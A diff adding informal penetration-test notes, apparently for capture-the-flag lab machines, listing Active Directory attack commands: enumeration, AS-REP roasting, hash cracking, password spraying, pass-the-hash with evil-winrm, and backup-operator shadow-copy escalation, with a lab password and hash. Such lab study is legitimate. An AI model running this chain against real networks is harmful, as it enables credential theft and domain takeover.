@@ -1,0 +1,86 @@
+>>nmap -A -sV -sC -T4 10.10.10.175 -p- -oN full_tcp.nmap
+
+
+
+use gobuseter when IIS service is running
+
+>>gobuster dir -u http://10.10.10.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,php,txt -t 80 > gobuster.txt
+
+find any information to users
+
+
+ Zone Transfer
+
+>>dig @10.10.10.192 AXFR blackfield.local
+
+ldap search
+now using ldapsearch to find interesting ??
+
+>>ldapsearch<< -H ldap://10.10.10.192 -x -b "dc=BLACKFIELD,dc=local"
+
+
+Enumeration service of domain controller AS-REP Pre authentication accounts
+
+
+>>impacket-GetNPUsers  Egotistical-bank.local/ -dc-ip 10.10.10.175
+
+NUll access with rpcclient and smbclient
+
+>>rpcclient 10.10.10.192 -U""
+>>smbclient \\\\10.10.10.192\\forensics$ -U ""
+
+user list found now user enumerations
+
+>>kerbrute userenum -d blackfield.local users.txt --dc 10.10.10.192
+
+now found vaild username
+
+AS-REP rosting attack on valid username
+
+>>impacket-GetNPUsers  blackfield.local/support -dc-ip 10.10.10.192 -request -no-pass
+
+>>hashcat -h | grep -i "as-rep"
+
+>>hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+
+got password '#00^BlackKnight'
+
+Privilege Escalation
+>>crackmapexec smb 10.10.10.192 -u "support" -p "#00^BlackKnight" -d blackfield.local
+>>crackmapexec winrm 10.10.10.192 -u "support" -p "#00^BlackKnight" -d blackfield.local
+
+
+since smb won't pwned then we can't access the impacket-psexec
+
+>>impacket-psexec support:'#00^BlackKnight'@10.10.10.192
+
+
+passwordspary attack
+
+>>kerbrute passwordspray -d blackfield.local --dc 10.10.10.192 user2.txt '#00^BlackKnight'
+
+using blooadhound to find the kerborsotable accounts
+
+
+>>bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -gc DC01.blackfield.local -c all -ns 10.10.10.192
+
+find the bloodhound file and try to find intersting
+
+login service accounts
+
+>>evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
+>>whoami /priv
+>>net user svc_backup /domain
+>>net group "Domain Admins" /domain
+
+After enumerating further about the svc_backup user, we found that the user is also a member of the backup operators group. A backup operator group member has the privilege to make a disk shadow copy and access all files owned by the system. With a quick search, we got another article published by hacking articles backup privilege escalation techniques. Following the blog, we created a file instructing disk shadow to create a copy of C: Drive into Z: drive as alias raj and saved it as raj.dsh file. The DSH file extension indicates to your device which app can open the file. However, different programs may use the DSH file type for different types of data. Then we compiled it into DOS format to use in the windows host.
+
+
+
+
+
+
+
+
+
+
